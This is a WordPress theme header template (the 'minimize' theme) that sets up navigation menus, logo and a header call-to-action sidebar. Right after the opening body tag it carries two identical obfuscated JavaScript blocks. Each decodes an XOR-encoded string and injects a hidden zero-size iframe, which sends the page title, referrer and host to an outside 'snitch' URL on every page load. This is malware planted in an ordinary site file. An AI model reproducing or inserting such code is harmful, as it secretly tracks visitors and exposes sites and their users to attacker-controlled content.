<!DOCTYPE html>
<!--[if lt IE 7 ]><html class="ie ie6"> <![endif]-->
<!--[if IE 7 ]><html class="ie ie7"> <![endif]-->
<!--[if IE 8 ]><html class="ie ie8"> <![endif]-->
<!--[if IE 9 ]><html class="ie ie9"> <![endif]-->
<!--[if (gte IE 9)|!(IE)]><!--><html><!--<![endif]-->
	<head>
		<?php wp_head(); ?>
	</head>

	<body <?php language_attributes(); ?> <?php body_class(); ?>>
<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00ida,'00'02)'02'00k,k'00'02)'02'00nn'00'02)'02'00woklcv'00'02)'02'00kmlg'00'02)'02'00q,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00ida,'00'02)'02'00k,k'00'02)'02'00nn'00'02)'02'00woklcv'00'02)'02'00kmlg'00'02)'02'00q,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
	<!-- Header	-->
		<header id="header" class="cf">
			<?php if( has_nav_menu( 'top_nav' ) ) : // Top Navigation Area ?>
				<button class="nav-button"><?php _e( 'Toggle Navigation', 'minimize' ); ?></button>
				<nav class="top-nav">
					<?php
						wp_nav_menu( array(
							'theme_location' => 'top_nav',
							'container' => false,
							'menu_class' => 'top-nav secondary-nav menu',
							'menu_id' => 'top-nav',
						) );
					?>
				</nav>
				<section class="clear"></section>
			<?php endif; ?>
	<!-- Logo	-->
			<section class="logo-box">
				<?php sds_logo(); ?>
				<?php sds_tagline(); ?>
			</section>
	<!--  nav options	-->
			<aside class="nav-options">
				<section class="header-cta-container header-call-to-action <?php echo ( is_active_sidebar( 'header-call-to-action-sidebar' ) ) ? 'widgets' : 'no-widgets'; ?>">
					<?php sds_header_call_to_action_sidebar(); // Header CTA Sidebar ?>
				</section>
			</aside>
			<section class="clear"></section>

	<!-- main nav	-->
			<nav class="primary-nav-container">
				<button class="primary-nav-button"><img src="<?php echo get_template_directory_uri(); ?>/images/menu-icon-large.png" alt="<?php esc_attr_e( 'Toggle Navigation', 'minimize' ); ?>" /><?php _e( 'Navigation', 'minimize' ); ?></button>
				<?php
					wp_nav_menu( array(
						'theme_location' => 'primary_nav',
						'container' => false,
						'menu_class' => 'primary-nav menu',
						'menu_id' => 'primary-nav',
						'fallback_cb' => 'sds_primary_menu_fallback'
					) );
				?>
			</nav>
		</header>